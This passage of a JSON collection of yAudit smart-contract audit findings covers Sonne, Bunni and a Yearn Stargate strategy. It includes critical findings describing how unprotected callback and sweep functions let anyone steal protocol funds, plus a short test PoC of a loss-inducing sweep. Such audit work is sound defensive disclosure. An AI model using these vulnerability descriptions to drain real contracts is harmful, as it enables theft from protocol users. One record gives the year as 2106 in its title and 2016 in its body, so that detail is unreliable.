        "body": "There are two functions for each SafeMath operation. One of the functions supports an arbitrary error message by providing a function argument for this message. The other function has a hardcoded error message. The way that sub() and div() are implemented is by having the hardcoded error message implementation calling the arbitrary error message implementation with a hardcoded error string. But add() and mul() are not implemented in this way. Instead, add() and mul() reimplement the function with the arbitrary error message but replace the function argument with a hardcoded string. Consider using the same approach from sub() and div() in add() and mul() to avoid reimplementing the same logic.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "41. Incorrect price oracle address in Sonne docs",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md",
        "body": "Sonne docs show the price oracle address is 0xEFc0495DA3E48c5A55F73706b249FD49d711A502. But the Comptroller oracle state variable has the value of 0x8d0db2bd9111e35554b8152e172451c80dff22b7. The older Sonne price oracle does not contain data for tokens soWBTC, soLUSD, and sowstETH.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "42. No comparison against minAnswer or maxAnswer",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md",
        "body": "The Chainlink data is verified to be greater than zero, but a stricter check would use the aggregator minAnswer and maxAnswer values. Chainlink documents this approach in their docs. Many tokens, like USDC or USDT, have a minAnswer value equivalent of $0.01.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "43. _getLatestPrice() timeStamp return value never used",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md",
        "body": "_getLatestPrice() is an internal function with two return values, uPrice and timeStamp. timeStamp is not used when this internal function is called so it can be removed.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "44. Protocol will stop working after year 2106",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md",
        "body": "getBlockNumber() is safecast to uint32 in Comptroller.sol (1, 2) and will revert in the year 2016 when block.timestamp is too large for this type.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "45. Typos",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md",
        "body": "compAccued() in BasicLens should be compAccrued(). Also consider modifying the function and variable names that include the word block because the Sonne implementation of all of these functions and variables uses seconds, not blocks. getBlockNumber() -> getBlockTimestamp() blocksPerYear -> secondsPerYear multiplierPerBlock -> multiplierPerSecond jumpMultiplierPerBlock -> jumpMultiplierPerSecond baseRatePerBlock -> baseRatePerSecond",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "46. Use interface instead of call function",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md",
        "body": "Calling the contract using an interface is more secure than using call function. File ExternalRewardDistributor.sol contains the interface for ExternalRewardDistributor contract. Change call function defined at L1458, L1590, L1639, L1700 and L1792.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "47. SNX token risk",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md",
        "body": "SNX had a double entrypoint issue that was found in Balancer. The issue was originally reported for mainnet but the same bug was applicable on Optimism. Even after this fix, the mainnet SNX code and the Optimism SNX code are different. The SNX token on mainnet and Optimism is using a form of proxy, and the implementation on Optimism has assembly code that differs from the OpenZeppelin implementation. The code of this token is out of scope of the Sonne audit, but risks to Sonne can be introduced by supporting markets for tokens that have added risks.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "48. Solidity version 0.8.20",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2023-Sonne.md",
        "body": "New opcode PUSH0 is introduced in Solidity version 0.8.20 which may not be supported on a chain other than mainnet like L2 chains.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "1. Anyone can call uniswapV3MintCallback() stealing the protocol fees",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Bunni.md",
        "body": "LiquidityManagement::uniswapV3MintCallback() only checks that msg.sender == address(decodedData.pool), which any attacker can trivially fulfill by setting decodedData.pool to an address they own. The function then transfers decodedData.pool.token0() and decodedData.pool.token1() to msg.sender, the amount of which is specified by the caller.",
        "labels": [
            "yAudit",
            "Severity: Critical",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "2. Anyone can call the PeripheryPayments sweepToken() stealing the protocol fees",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Bunni.md",
        "body": "PeripheryPayments is a dependency of the LiquidityManagement contract, which is a dependency of the BunniHub contract. PeripheryPayments has a sweepToken() with no access control which allows a caller to transfer any token from the BunniHub contract to any recipient.",
        "labels": [
            "yAudit",
            "Severity: Critical",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "3. Anyone can call the PeripheryPayments unwrapWETH9() stealing the weth stored in BunniHub",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Bunni.md",
        "body": "PeripheryPayments is a dependency of the LiquidityManagement contract, which is a dependency of the BunniHub contract. PeripheryPayments has a unwrapWETH9() with no access control which allows a caller to the contract's weth balance from the BunniHub contract to any recipient.",
        "labels": [
            "yAudit",
            "Severity: Critical",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "4. General complexity around ETH management including certain circumstances where ETH could be lost",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Bunni.md",
        "body": "The BunniHub contract currently only has one payable function that can receive ETH which is the receive() found in PeripheryPayments. That function requires that the sender is WETH9. In general BunniHub will not be interacting with ETH but there is functionality embedded with the Uniswap imports related to the management of ETH which adds complexity and some risk. abstract contract PeripheryPayments is IPeripheryPayments, PeripheryImmutableState { receive() external payable { require(msg.sender == WETH9, 'Not WETH9'); } If for some reason someone unwrapped WETH and set the recipient to the BunniHub, then the contract would no hold the ETH. This ETH could be taken by anyone via refundEth() or it could also be included used the next time anyone deposited into a WETH pool since pay() includes some logic that is designed to work with with unwrapping WETH: function pay( address token, address payer, address recipient, uint256 value ) internal { if (token == WETH9 && address(this).balance >= value) { // pay with WETH9 IWETH9(WETH9).deposit{value: value}(); // wrap only what is needed to pay IWETH9(WETH9).transfer(recipient, value); } else if (payer == address(this)) { ...",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "5. Calling withdraw() forfeits uncollected LP fees",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Bunni.md",
        "body": "Fees are collected and reinvested via compound(), but when withdraw() is called, fees are not collected.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "6. Optimize the sweepTokens() loop",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Bunni.md",
        "body": "@@ -436,12 +453,16 @@ contract BunniHub is - for (uint256 i = 0; i < tokenList.length; i++) { + uint256 tokenListLength = tokenList.length; + for (uint256 i = 0; i < tokenListLength;) { SafeTransferLib.safeTransfer( tokenList[i], recipient, tokenList[i].balanceOf(address(this)) ); + unchecked { + ++i; + } } Incrementing i can be done in an unchecked block because the number of tokens will not overflow saving 108 gas per per iteration. The length of an array can be stored outside of the for loop for additional gas savings 3 gas per iteration.of as is suggested here. Incrementing with ++i instead of i++ saves ~5 gas per iteration from reduced stack operations.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "7. Upgrade to at least solidity 0.8.4",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Bunni.md",
        "body": "Currently there is no underflow or overflow protection at the compiler level in Bunni, which means SafeMath style libraries are necessary, which are gas inefficient compared to the compiler and potentially less safe. Also see hrkrshnn's related comment.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "8. Use latest versions of unmodified libraries",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Bunni.md",
        "body": "The contracts are using Solidity 0.7.6 some library contracts (CREATE3, ERC20, and SafeTransferLib) were copied into the directory rather than being imported. However, due to these being copied into the project and also because of some modifications, they do not match the latest versions of these projects.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "9. Consider Foundry scripting for the deployment scripts",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Bunni.md",
        "body": "Currently bash scripts are used for the deployment scripts. While they are currently relatively simple, as the project progresses this may no longer be the case.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "10. Typo in README",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Bunni.md",
        "body": "There is a typo in the README \"perfer\".",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "11. Consider adding npm related steps to the README",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Bunni.md",
        "body": "npm is used to manage dependencies but this information is not present in the README.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "12. Consider removing the WETH unwrapping logic",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/08-2022-Bunni.md",
        "body": "One of the critical findings is related to WETH management. If it's not necessary it is a source of unecessary additional complexity that may lead to other future vulnerabilities.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "1. Discrepancy in BaseStrategy versioning",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md",
        "body": "The git blame of BaseFeeOracle.sol from the yearn-vaults repo shows that the entire file is a new addition for yearn-vaults release v0.4.5. The file diff for PR #546 confirms the introduction of baseFee values in the v0.4.5 release.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "2. estimatedTotalAssets() does not include value of reward tokens",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md",
        "body": "The function name estimatedTotalAssets() implies all value held by the strategy is accounted for. The rewards from the staking pool are not, however, included in this calculation. This means after _claimRewards() is called in prepareReturn(), the value of _profit doesn't include the rewards just claimed. The _profit only includes these rewards after ySwap or Cowswap swaps the reward to want, which causes a delay in perceived profits. It may be intentional to only include the value of want and LP tokens in this calculation. Because this is a public function, other users or protocols may assume the function does account for all forms of value held by the strategy, which is an incorrect assumption. Instead, after rewards are claimed by the strategy and are converted into want tokens, the total assets of this strategy will suddenly increase. The amount of this sudden increase could vary depending on how often the rewards are redeemed from the staking pool and how often they are swapped for want. Beyond the inclusion of rewards in the profit and asset values, without guarantees around when the ySwap process will happen, it is possible that the strategy may hold the reward tokens in the form of STG or eTokens for some time. This would delay the start of compound interest on those rewards. Clearer guarantees or incentives to minimize the time between harvest() and the ySwap would resolve this.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "3. Loss calculation discrepancies",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md",
        "body": "The loss calculation in prepareReturn() is calculated with several assumptions. We will examine each step of the calculations and the relevant assumptions. The first loss calculation is in withdrawSome(). The loss will be zero if _potentialLoss < balanceOfLPTokens. This calculation assumes the LP tokens have the value that the Stargate pool advertises, which is a multiple of the underlying want asset (with bridge fees slowly adding to this value). But relying on the Pool to provide the value of an LP token assumes that the Pool is working normally and all LP tokens can be withdrawn. If the LP tokens cannot be withdraw, they will have zero value and cannot be assumed to compensate for any potential loss. The delta credit calculation is a complex algorithm, so it should be evaluated whether this complexity may introduce risk. The loss calculation may be problematic for liquidatePosition(), where the BaseStrategy describes the return values with the comment This function should return the amount of want tokens made available by the liquidation. If there is a difference between them, _loss indicates whether the difference is due to a realized loss, or if there is some other sitution at play (e.g. locked funds) where the amount made available is less than what is needed. Because withdrawSome() returns a loss of 0 even when there are locked funds, it may not meet with the described goal of the loss return value in liquidatePosition() if locked funds are considered losses (either because of temporary delta credit limits or because of a hack). The second loss calculation is in prepareReturn(). The calculation depends on whether _vaultDebt > _totalAssets is true. The problem with this is that a separate finding explains how estimatedTotalAssets() does not include the value of reward tokens, and _totalAssets = estimatedTotalAssets() in this calculation. If there is substantial value stored in reward tokens, the value of _totalAssets would be lower than the value of assets held by the strategy, meaning the loss value may be calculated as a larger loss than in reality once the reward tokens are factored in. The third loss calculation is at the end of prepareReturn(). This calculation compares loss to profit, but like the previous step of loss calculations, profit is dependent on estimatedTotalAssets(), so the profit may be less than in actuality. If _loss > _profit, then the reduction in loss may partially cancel out the inflation of the loss from the previous step, but if _loss <= _profit, then loss would not receive this adjustment.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "4. Variables set to Ethereum addresses",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md",
        "body": "The strategy is planned to use on other chains, like Optimism. These variables should be defined per chain.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "5. Emergency unstake forgoes extra rewards even when they can be claimed",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md",
        "body": "_emergencyUnstakeLP is an internal function executed during migration, or during admin-initiated emergency exits. In the former case, migration can be required even if the staker contract is still functional and is receiving rewards. In the latter case, admin can call emergency unstake by mistake when the rewards are still claimable. In both cases, pending rewards will be discarded and irrecoverably stuck in the Stargate LP staker contract.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "6. Duplicate line of code",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md",
        "body": "In prepareReturn(), the forceHarvestTriggerOnce variable gets set to false. However, the BaseStrategy does the exact same thing right after the call to prepareReturn() is completed, even with the same comment. This line of code (and the comment) is redundant.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "7. Use BaseStrategy logic for gas savings",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md",
        "body": "The BaseStrategy saves an if statement in harvestTrigger() by returning the final boolean directly. The current strategy implementation is not as direct.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "8. Use Solidity errors in 0.8.4+",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md",
        "body": "Require statements are used in the strategy and error messages are not used anywhere. Using this new solidity feature can provide gas savings on revert conditions.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "9. Use simple comparison",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md",
        "body": "The prepareReturn() function contains this code: if (_liquidWant <= _profit) { _profit = _liquidWant; _debtPayment = 0; // enough to pay for all profit and _debtOutstanding (partial or full) } else { _debtPayment = Math.min(_liquidWant - _profit, _debtOutstanding); } By switching around the if/else clauses, we can replace the compound operator with a simple one if (_liquidWant > _profit) { _debtPayment = Math.min(_liquidWant - _profit, _debtOutstanding); } else { _profit = _liquidWant; _debtPayment = 0; // enough to pay for all profit and _debtOutstanding (partial or full) }",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "10. Use unchecked if no underflow risk",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md",
        "body": "The first location where unchecked can be applied - _profit = _totalAssets > _vaultDebt ? _totalAssets - _vaultDebt : 0; + unchecked { _profit = _totalAssets > _vaultDebt ? _totalAssets - _vaultDebt : 0; } The second location where unchecked can be applied - (_amountFreed, _loss) = withdrawSome( - _toLiquidate - _wantBalance - ); + unchecked { (_amountFreed, _loss) = withdrawSome( + _toLiquidate - _wantBalance + ); } Similar savings can be found throughout the contract because many logic checks remain from a recent commit where the strategy was migrated from an older version of solidity that did not have built-in SafeMath to a newer version that does have SafeMath. Other examples are found here, here, here, here, here, here, here, here, here, and here.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "11. Remove unneeded variables",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md",
        "body": "_amountFreed is set in prepareReturn() but is never used after that point. The variable and the lines setting it can be deleted to save gas. In withdrawSome(), _liquidatedAmount is used only to return the proper value, and in on branch of the if statement _liquidatedAmount is set to _liquidAssets. Instead of creating a new temporary variable _liquidAssets, use _liquidatedAmount instead and change the if statement logic to - uint256 _liquidAssets = balanceOfWant() - _preWithdrawWant; + _liquidatedAmount = balanceOfWant() - _preWithdrawWant; - if (_amountNeeded > _liquidAssets) { + if (_amountNeeded > _liquidatedAmount) { - _liquidatedAmount = _liquidAssets; uint256 balanceOfLPTokens = _lpToLd(balanceOfAllLPToken()); - uint256 _potentialLoss = _amountNeeded - _liquidAssets; + uint256 _potentialLoss = _amountNeeded - _liquidatedAmount; _loss = _potentialLoss > balanceOfLPTokens ? _potentialLoss - balanceOfLPTokens:0; } else { _liquidatedAmount = _amountNeeded; } At L218 there is no need define _liquidWant and call balanceOfWant(). Recalculate _ wantBalance after L213. Remove variable _liquidWant and use _wantBalance instead.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "12. Remove unneeded if statement",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md",
        "body": "withdrawSome() contains an if statement of if (_amountNeeded > 0). The two instances where this internal function is called is on line 210 and line 298. In both instances, the _amountNeeded function argument is greater than zero, so the if statement can be removed because the code in the if statement will always be used.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "13. Unnecessary internal function call",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md",
        "body": "_lpToLd() calls liquidityPool.amountLPtoLD(). _lpToLd() is only used once, in withdrawSome(). liquidityPool.amountLPtoLD() is already called directly in valueOfLPTokens(), so _lpToLd() may as well be removed and the single instance of it replaced with a direct call to the external function. The same approach could be taken with _stakeLP() which calls the external lpStaker.deposit() function.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "14. balanceOfReward() can be external",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md",
        "body": "If a function is only called externally and does not need to be called internally, it can be declared external for gas savings. Apply this to balanceOfReward().",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "15. Faster return from function",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md",
        "body": "If the input param _amountNeeded is 0 there is no need to do any calculations.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "16. Minor fix not applied to mainnet strats",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md",
        "body": "Changes in recent commits, such as 36ddf75 and a1aaf31, contain changes that do not appear in the mainnet strategy contract code. The code on mainnet is using an older version of the contract code. Although the differences do not appear to impact the logic of the strategy, it is normally a good idea to update code on mainnet when improvements are made.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "17. Incorrect comment(s)",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md",
        "body": "There is a comment Amount of tokens that all strategies have borrowed in the strategy on the line of code for vault.strategies(address(this)).totalDebt. This comment was copied from the Vault contract's comment about the Vault's totalDebt state variable, and does not properly describe the code on this line because this line uses the totalDebt value in the StrategyParams struct for a specific strategy.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "18. Interfaces are not cleanly defined",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md",
        "body": "Several unexpected situations are found in the interface files: The standard IERC20 interface file does not have a token() function, but the IERC20Metadata.sol file has a token() function. This is probably a mistake that should be fixed because token() should only be called on pool addresses and is defined in IPool. Instead, consider adding name() to this interface like the OpenZeppelin IERC20Metadata.sol file. The ILPStaking interface contains pendingStargate() and pendingEmissionToken() functions. These functions are not found in the same Stargate contract. The interface combines functions from LPStaking and LPStakingTime to avoid creating a new interface file. decimals() can be removed from IWETH.sol because it is not used in the strategy.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "19. tradeFactory.disable() never called",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md",
        "body": "setTradeFactory() is designed to migrate to a new ySwaps trade factories. _removeTradeFactoryPermissions() removes the approval of the old tradeFactory before a new one is approved. _removeTradeFactoryPermissions() does not call tradeFactory.disable(), but it might be preferable to do so and follow the design of how the TradeFactory contract was written.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "20. Could use Stargate RouterETH for WETH/SGETH conversion",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md",
        "body": "The list of Stargate contracts deployed on mainnet shows two router contracts, one named Router and one named RouterETH. Strangely, the RouterEth contract does not exist in the main branch of Stargate's github repository. The code is verified on Etherscan and shows that RouterEth.sol integrates with the SGETH contract to support ETH deposits. The addLiquidityETH() function in RouterEth could serve the same purpose as the custom _convertWETHtoSGETH() found in the strategy. Whether it is better to use existing code outside of the strategy or create an implementation in the strategy is up to the developers to determine, and the choice may come down to gas cost.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "21. Documentation improvements possible",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md",
        "body": "The only difference between harvestTrigger() in BaseStrategy and Strategy is that the Strategy implementation adds a check for the minReportDelay value and uses > maxReportDelay instead of >= maxReportDelay. Most of the logic in the custom implementation could be replaced by a super.harvestTrigger() as suggested in the BaseStrategy NatSpec.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "22. No USDT pool on Optimism",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md",
        "body": "A comparison was done of the Stargate contracts on the different chains where Yearn Finance operates (mainnet, Arbitrum, and Optimism). The deployed contracts are listed in the Stargate docs. The findings from this comparison were: Mainnet and Arbitrum contracts of Stargate are identical Optimism has no USDT pool There are two differences between Arbitrum and Optimism a) The USDC Pool.sol on Optimism uses a flattened import structure for some odd reason, but otherwise the logic is the same in the pool contract and all imported files b) The LPStaking contract on Arbitrum and mainnet is renamed to LPStakingTime on Optimism and these contract have many differences: i) The LPStakingTime contract on Optimism uses an \"eToken\" with emissions for rewards (not STG). The eToken is OP, the Optimism token. It is a standard OpenZeppelin ERC20 token rather than the custom StarGate token that is not a simple OpenZeppelin ERC20. ii) The LPStakingTime contract on Optimism uses block.timestamp instead of block.number because this is one of the known differences in Optimism. iii) Some functions in LPStakingTime are external while the same function in LPStaking is public.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "23. == true unnecessary for boolean evaluation",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md",
        "body": "Booleans evaluated with true in the form require(wantIsWETH == true) can be simplified to require(wantIsWETH). The longer form may be easier to understand depending on the reader.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "24. aeWETH on Arbitrum is not an exact WETH9 clone",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md",
        "body": "aeWETH on Arbitrum inherits WETH9 but is not an exact clone of the Ethereum mainnet WETH9 contract like WETH on Optimism. Extra attention may be needed here when deploying the strategy on Arbitrum for WETH.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "25. Rename variable",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md",
        "body": "The name _liquidAssets is a bit misleading because it represents only a part of liquid assets, i.e. liquidated assets.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "26. Use vault decimals",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md",
        "body": "Decimals data is stored in the vault. No need to add additional imports.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "27. Use explicit uint type",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md",
        "body": "Style change.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "28. Unused interface IPriceFeed",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md",
        "body": "Interface is defined but not used in the code.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "29. Missing protected token",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md",
        "body": "Sweeping LP token, strategy will report a loss. Only unstaken LP tokens can be sweeped. PoC: def test_sweep_lp(gov, vault, strategy, token, user, amount, token_lp, chain, RELATIVE_APPROX): # 1- Deposit to the vault token.approve(vault.address, amount, {\"from\": user}) vault.deposit(amount, {\"from\": user}) assert token.balanceOf(vault.address) == amount strategy.setDoHealthCheck(False, {\"from\": gov}) # 2- Harvest chain.sleep(1) strategy.harvest({\"from\": gov}) assert pytest.approx(strategy.estimatedTotalAssets(), rel=RELATIVE_APPROX) == amount # 3- Unstake LP tokens strategy.unstakeLP(amount, {\"from\": gov}) # 4- Sweep LP tokens unprotected_tokens = [token_lp] for token in unprotected_tokens: strategy.sweep(token, {\"from\": gov}) # Strategy lost all of it's money assert pytest.approx(strategy.estimatedTotalAssets(), rel=RELATIVE_APPROX) == 0 # Strategy still has debt assert vault.strategies(strategy).dict()[\"totalDebt\"] == amount # 5- Report loss chain.sleep(1) tx = strategy.harvest({\"from\": gov}) assert tx.events[\"StrategyReported\"][\"loss\"] == amount assert vault.strategies(strategy).dict()[\"totalLoss\"] == amount",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "30. Change function emergencyUnstakeLP() visibility",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md",
        "body": "Current visibility is set to public but can be changed to external because strategy uses internal function implementation _emergencyUnstakeLP().",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "31. Reward token can be swept by governance",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md",
        "body": "BaseStrategy contract has a virtual function to define which tokens cannot be swept by the governance. The Strategy contract does not honor this by not setting the reward token as protected.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "32. Reverts are missing reason string",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md",
        "body": "There are five instances of this issue (1, 2, 3, 4, 5).",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "33. Returned address from create is not explicitly checked to be non-zero",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md",
        "body": "In assembly, create does not revert when a deployment fails. It instead returns zero address. This is currently not an issue because there is an implicit check due to the call made to the newStrategy. However, not having an explicit check might cause this to be overlooked in future refactorings of the code.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "34. Missing Zero-Address Check",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md",
        "body": "The lpStaker assignment in initializeThis() is missing a zero address check. Granted, there is an implicit revert when a function is called on zero address; however, debugging an unnamed revert could end up consuming valuable time. As such, a zero address check would expedite Strategy deployment and operation by quickly reverting during the construction of the contract if the LPStaker address passed is a zero address.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "35. Cache storage variables",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md",
        "body": "Accessing a state variable for the first time in a function takes 2100 gas (Gcoldsload), and then 100 gas (Gwarmaccess) for each additional time. So, it is best to cache (store in a stack/ memory) the storage variable if there are multiple reads for it within the same function.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "36. Use calldata for unchanging external function args",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/11-2022-Yearn-Stargate-Strategy.md",
        "body": "We can use calldata instead of memory for array, struct or mapping type arguments in external functions, which are not mutated in the function. This will save gas since the argument would not need to be saved into memory first.",
        "labels": [
